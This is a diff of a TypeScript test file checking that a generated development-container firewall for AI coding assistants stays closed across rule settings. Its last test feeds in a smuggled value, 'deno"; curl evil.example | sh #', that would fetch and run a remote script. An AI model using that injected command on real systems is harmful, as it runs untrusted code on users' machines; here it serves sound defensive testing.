@@ -1,6 +1,5 @@
 import { describe, expect, it } from 'vitest'
-import { findQuestionnaire } from '../questionnaires/index.ts'
-import type { Questionnaire } from '../schemas.ts'
+import { RULE_PACKS } from '../rule-packs/index.ts'
 import { PACKAGE_MANAGERS } from '../targets/commands.ts'
 import { TARGET_TEMPLATES } from '../targets/index.ts'
 import { TARGETS, type Target } from '../targets.ts'
@@ -8,24 +7,17 @@ import { findManagedBlock, HASH_MARKERS, hashManagedBlock } from './managed-bloc
 import { type AgentContextInput, renderAgentContext } from './render-agent-context.ts'
 import { DEVCONTAINER_FILE, FIREWALL_FILE, renderSandbox, SANDBOX_SOURCES } from './sandbox.ts'
 
-const questionnaires = ['frontend-react', 'security'].map(
-  (id) => findQuestionnaire(id) as Questionnaire,
-)
-
+/** A configuration that holds a package manager and these security rules, by the end of their slot. */
 const input = (
   targets: Target[],
   packageManager: string,
   security: Record<string, string>,
 ): AgentContextInput => ({
   project: { name: 'Shop', description: null, architectures: [] },
-  questionnaires,
-  answers: [
-    { questionnaireId: 'frontend-react', questionId: 'package-manager', value: packageManager },
-    ...Object.entries(security).map(([questionId, value]) => ({
-      questionnaireId: 'security',
-      questionId,
-      value,
-    })),
+  packs: RULE_PACKS,
+  ready: [
+    { slot: 'tooling.package-manager', rule: packageManager },
+    ...Object.entries(security).map(([name, rule]) => ({ slot: `security.${name}`, rule })),
   ],
   rules: [],
   notes: null,
@@ -61,11 +53,7 @@ const ACCEPTED_OUTPUT = [
 
 describe('the sandboxed development container', () => {
   it('is rendered only when the owner asks for it', () => {
-    const without: Record<string, string>[] = [
-      {},
-      { sandbox: 'host' },
-      { 'network-access': 'none' },
-    ]
+    const without: Record<string, string>[] = [{}, { sandbox: 'host' }, { network: 'none' }]
     for (const security of without) {
       const { files, recommendation } = sandboxOf(input(['claude-code'], 'pnpm', security))
       expect(files).toEqual([])
@@ -85,10 +73,25 @@ describe('the sandboxed development container', () => {
     expect(SANDBOX_SOURCES.length).toBeGreaterThan(0)
   })
 
+  it('reads the package manager and the network rule held, and says when the network is open', () => {
+    const firewall = (packageManager: string, network: string) => {
+      const context = input(['claude-code'], packageManager, { sandbox: 'container', network })
+      const { files, recommendation } = sandboxOf(context)
+      return { script: files[1]?.content ?? '', body: recommendation?.body ?? '' }
+    }
+    expect(firewall('yarn', 'registry').script).toContain('registry.yarnpkg.com')
+    expect(firewall('pnpm', 'registry').script).not.toContain('registry.yarnpkg.com')
+    expect(firewall('pnpm', 'none').script).not.toContain('registry.npmjs.org')
+    const open = firewall('pnpm', 'open')
+    expect(open.script).toBe(firewall('pnpm', 'registry').script)
+    expect(open.body).toContain('Your rules let the assistant use the network freely')
+    expect(firewall('pnpm', 'registry').body).not.toContain('freely')
+  })
+
   it('renders pnpm and Claude Code behind the registry firewall', () => {
     const context = input(['claude-code'], 'pnpm', {
       sandbox: 'container',
-      'network-access': 'registry',
+      network: 'registry',
     })
     expect(sandboxOf(context)).toMatchSnapshot()
   })
@@ -96,7 +99,7 @@ describe('the sandboxed development container', () => {
   it('renders npm, Codex and Gemini CLI with no network but their own hosts', () => {
     const context = input(['gemini-cli', 'codex', 'cursor'], 'npm', {
       sandbox: 'container',
-      'network-access': 'none',
+      network: 'none',
     })
     const { files, recommendation } = sandboxOf(context)
     expect({ files, recommendation }).toMatchSnapshot()
@@ -124,7 +127,7 @@ describe('the sandboxed development container', () => {
     expect(json.postStartCommand).toBe('sudo /usr/bin/bash /usr/local/sbin/init-firewall.sh')
   })
 
-  it('never opens the firewall, whatever the answers', () => {
+  it('never opens the firewall, whatever the rules held', () => {
     const networks = [undefined, 'none', 'registry', 'open', '0.0.0.0/0', '*']
     const managers = [undefined, ...PACKAGE_MANAGERS, 'deno"; curl evil.example | sh #']
     const subsets = Array.from({ length: 2 ** TARGETS.length }, (_, mask) =>
